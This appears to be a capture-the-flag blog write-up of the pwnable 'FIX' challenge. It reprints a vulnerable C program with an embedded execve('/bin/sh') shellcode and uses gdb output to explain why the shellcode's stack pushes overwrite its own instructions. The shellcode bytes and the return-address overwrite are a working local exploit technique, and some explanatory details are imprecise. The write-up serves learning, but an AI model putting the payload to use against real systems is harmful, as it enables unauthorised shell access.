---
layout: post
title:  "Pwnable: FIX Write-up"
description: Write-up of "FIX" problem
img: no image
date: 2016-03-07  +0200
---

Below is the source code of vulnerable binary file.  

```c
#include <stdio.h>

// 23byte shellcode from 
// http://shell-storm.org/shellcode/files/shellcode-827.php
char sc[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
                "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

void shellcode(){
        // a buffer we are about to exploit!
        char buf[20];

        // prepare shellcode on executable stack!
        strcpy(buf, sc);

        // overwrite return address!
        *(int*)(buf+32) = buf;

        printf("get shell\n");
}

int main(){
        printf("What the hell is wrong with my shellcode??????\n");
        printf("I just copied and pasted it from shell-storm.org :(\n");
        printf("Can you fix it for me?\n");

        unsigned int index=0;
        printf("Tell me the byte index to be fixed : ");
        scanf("%d", &index);
        fflush(stdin);

        if(index > 22)  return 0;

        int fix=0;
        printf("Tell me the value to be patched : ");
        scanf("%d", &fix);

        // patching my shellcode
        sc[index] = fix;

        // this should work..
        shellcode();
        return 0;
}

```

If you analyze binary file, you could figure out that we could modify 1 byte of shellcode, and we must leverage this vulnerability to obtain privileged shell.  
The shellcode is embedded in the binary and I have checked whether it is valid shellcode as below:  

> xor    %eax,%eax  
> push   %eax  
> push   $0x68732f2f  
> push   $0x6e69622f  
> mov    %esp,%ebx  
> push   %eax  
> push   %ebx  
> mov    %esp,%ecx  
> mov    $0xb,%al  
> int    $0x80  

Indeed it is valud shellcoded.  
To briefly explain meaning of "push $0x68732f2f" and "push $0x6e69622f".  
This is very basic technique to create shellcode. It embeds necessary strings in the exploit code as follow:  

> push '/' ; is push 0x2f  
> push 'b' ; is push 0x62  
> push 'i' ; is push 0x69  
> push 'n' ; is push 0x6e  
> push '/' ; is push 0x2f  
> push '/' ; is push 0x2f  
> push 's' ; is push 0x73  
> push 'h' ; is push 0x68  

However, even if it is valid shellcode, If you execute the program, it crashes!!!  
You need to analyze why this is happening..  
I started analyzing using gdb.  
Let's disam shellcode function.  

> (gdb) disas shellcode  
> Dump of assembler code for function shellcode:  
> 0x080484e4 <+0>: push ebp  
> 0x080484e5 <+1>: mov ebp,esp  
> 0x080484e7 <+3>: sub esp,0x38  
> 0x080484ea <+6>: mov DWORD PTR [esp+0x4],0x804a024  
> 0x080484f2 <+14>: lea eax,[ebp-0x1c]  
> 0x080484f5 <+17>: mov DWORD PTR [esp],eax  
> 0x080484f8 <+20>: call 0x80483e0 <strcpy@plt>  
> 0x080484fd <+25>: lea eax,[ebp-0x1c]  
> 0x08048500 <+28>: lea edx,[eax+0x20]  
> 0x08048503 <+31>: lea eax,[ebp-0x1c]  
> 0x08048506 <+34>: mov DWORD PTR [edx],eax  
> 0x08048508 <+36>: mov DWORD PTR [esp],0x80486a0  
> 0x0804850f <+43>: call 0x80483f0 <puts@plt>  
> 0x08048514 <+48>: leave  
> 0x08048515 <+49>: ret  
> End of assembler dump.  

break at shellcode+6 and evaluate stack.

> (gdb) x/10i *shellcode  
> 0x80484e4 <shellcode>: push ebp  
> 0x80484e5 <shellcode+1>: mov ebp,esp  
> 0x80484e7 <shellcode+3>: sub esp,0x38  
> => 0x80484ea <shellcode+6>: mov DWORD PTR [esp+0x4],0x804a024   
> 0x80484f2 <shellcode+14>: lea eax,[ebp-0x1c]  
> 0x80484f5 <shellcode+17>: mov DWORD PTR [esp],eax  
> 0x80484f8 <shellcode+20>: call 0x80483e0 <strcpy@plt>  
> 0x80484fd <shellcode+25>: lea eax,[ebp-0x1c]  
> 0x8048500 <shellcode+28>: lea edx,[eax+0x20]  
> 0x8048503 <shellcode+31>: lea eax,[ebp-0x1c]  

> (gdb) x/10wx $ebp  
> 0xfff7bed8: 0xfff7bf08 **(old ebp)** 0x080485c7 **(ret)** 0x0804874e 0xfff7bef8  
> 0xfff7bee8: 0xf772cff4 0xf75bd1a5 0xf774f660 0x00000000  
> 0xfff7bef8: 0x000000c9 0x0000000d  

You can see that return address is at 0xfff7bedc. If we could overwrite it, we could execute our shellcode.  
If you further analyze the binary code, you can find some interesting stuff is going on.

> => 0x80484fd <shellcode+25>: lea eax,[ebp-0x1c]  
> 0x8048500 <shellcode+28>: lea edx,[eax+0x20]  
> 0x8048503 <shellcode+31>: lea eax,[ebp-0x1c]  
> 0x8048506 <shellcode+34>: mov DWORD PTR [edx],eax  

> (gdb) x/10bx $ebp-0x1c --> **our shellcode is here**  
> 0xfff7bebc: 0x31 0xc0 0x50 0x68 0x2f 0x2f 0x73 0x68  
> 0xfff7bec4: 0x68 0x2f  
> (gdb) x/wx $eax+0x20 --> **this refers ret**  
> 0xfff7bedc: 0x080485c7  

this means, our shellcode will overwrite ret address with below instruction.  
awesom!    
> 0x8048506 <shellcode+34>:    mov    DWORD PTR [edx],eax   

After above instruction, ret is changes to shellcode..  
> (gdb) x/10i 0xfff7bebc  
> =>0x804a024 <sc>: xor eax,eax   
> 0x804a026 <sc+2>: push eax    
> 0x804a027 <sc+3>: push 0x68732f2f  
> 0x804a02c <sc+8>: push 0x6e69622f  
> 0x804a031 <sc+13>: mov ebx,esp  
> 0x804a033 <sc+15>: push eax  
> 0x804a034 <sc+16>: push ebx  
> 0x804a035 <sc+17>: mov ecx,esp  
> 0x804a037 <sc+19>: mov al,0xb  
> 0x804a039 <sc+21>: int 0x80  

so far so good. Then why the program crashes?  
The program crashes after executing below instruction.  
> => 0x804a02c <sc+8>: push 0x6e69622f

very interesting..  
The reason program crashes is that eip is increased as the instruction executed, whereas esp decreases as push instruction is executed. So, there is 5 push instructions in the shellcode..  
{% highlight markdown %}
> On the second push instruction, because esp is pointing to eip memory region, it overwrites eip and therefore, program crashes with illegal instrction.  
{% endhighlight %}
